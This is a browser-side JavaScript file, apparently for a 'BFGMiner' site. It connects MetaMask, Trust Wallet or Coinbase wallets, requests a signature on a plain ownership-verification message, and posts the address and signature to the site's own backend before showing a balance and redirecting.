
document.addEventListener('DOMContentLoaded', function() {
    let walletProvider;
    let connectedAddress = null;

    // WalletConnect Provider Setup
    const WalletConnectProvider = window.WalletConnectProvider.default;

    // MetaMask Connection
    const connectMetaMask = async () => {
        if (typeof window.ethereum !== 'undefined') {
            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                connectedAddress = accounts[0];
                showStatus('MetaMask connected: ' + shortenAddress(connectedAddress), 'success');
                await validateAndLogWallet(connectedAddress, 'metamask');
            } catch (error) {
                showStatus('MetaMask connection failed: ' + error.message, 'error');
            }
        } else {
            showStatus('MetaMask not installed', 'error');
        }
    };

    // Trust Wallet / WalletConnect
    const connectTrustWallet = async () => {
        walletProvider = new WalletConnectProvider({
            rpc: { 1: 'https://cloudflare-eth.com' },
            qrcode: true,
            chainId: 1
        });

        try {
            await walletProvider.enable();
            connectedAddress = walletProvider.accounts[0];
            showStatus('Trust Wallet connected: ' + shortenAddress(connectedAddress), 'success');
            await validateAndLogWallet(connectedAddress, 'trustwallet');
        } catch (error) {
            showStatus('Trust Wallet connection failed: ' + error.message, 'error');
        }
    };

    // Coinbase Wallet / WalletConnect
    const connectCoinbase = async () => {
        walletProvider = new WalletConnectProvider({
            rpc: { 1: 'https://cloudflare-eth.com' },
            qrcode: true,
            chainId: 1
        });

        try {
            await walletProvider.enable();
            connectedAddress = walletProvider.accounts[0];
            showStatus('Coinbase Wallet connected: ' + shortenAddress(connectedAddress), 'success');
            await validateAndLogWallet(connectedAddress, 'coinbase');
        } catch (error) {
            showStatus('Coinbase Wallet connection failed: ' + error.message, 'error');
        }
    };

    // Sign message for verification (optional for ownership proof)
    const signMessage = async (address) => {
        let signer;
        if (typeof window.ethereum !== 'undefined') {
            signer = window.ethereum;
        } else if (walletProvider) {
            signer = walletProvider;
        }

        if (signer) {
            try {
                const message = `Sign this message to verify wallet ownership for BFGMiner: ${Date.now()}`;
                const signature = await signer.request({
                    method: 'personal_sign',
                    params: [message, address],
                });
                return { message, signature };
            } catch (error) {
                console.error('Signing failed:', error);
                return null;
            }
        }
        return null;
    };

    // Validate and log wallet to backend
    const validateAndLogWallet = async (address, method) => {
        try {
            const signResult = await signMessage(address);
            const response = await fetch('/api/connect-wallet', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: address,
                    connection_method: method,
                    signature: signResult ? signResult.signature : null,
                    message: signResult ? signResult.message : null
                })
            });

            const data = await response.json();
            if (data.success) {
                showStatus('Wallet connected successfully! Balance: $' + data.balance_usd.toFixed(2), 'success');
                setTimeout(() => {
                    window.location.href = '/connected';
                }, 2000);
            } else {
                showStatus(data.message || 'Connection failed', 'error');
            }
        } catch (error) {
            showStatus('Validation failed: ' + error.message, 'error');
        }
    };

    // Utility functions
    function shortenAddress(address) {
        return address ? `${address.slice(0, 6)}...${address.slice(-4)}` : '';
    }

    function showStatus(message, type) {
        const statusEl = document.getElementById('status-message');
        const errorEl = document.getElementById('error-message');
        const successEl = document.getElementById('success-message');

        statusEl.textContent = message;
        statusEl.className = type === 'success' ? 'text-center text-sm text-green-400' : 'text-center text-sm text-red-400';
        statusEl.classList.remove('hidden');

        if (type === 'error') {
            errorEl.textContent = message;
            errorEl.classList.remove('hidden');
            successEl.classList.add('hidden');
        } else {
            successEl.textContent = message;
            successEl.classList.remove('hidden');
            errorEl.classList.add('hidden');
        }
    }

    // Event listeners
    document.getElementById('metamask-btn').addEventListener('click', connectMetaMask);
    document.getElementById('trustwallet-btn').addEventListener('click', connectTrustWallet);
    document.getElementById('coinbase-btn').addEventListener('click', connectCoinbase);

    // Handle account changes
    if (window.ethereum) {
        window.ethereum.on('accountsChanged', (accounts) => {
            if (accounts.length === 0) {
                connectedAddress = null;
                showStatus('MetaMask disconnected', 'error');
            } else {
                connectedAddress = accounts[0];
            }
        });
    }
});
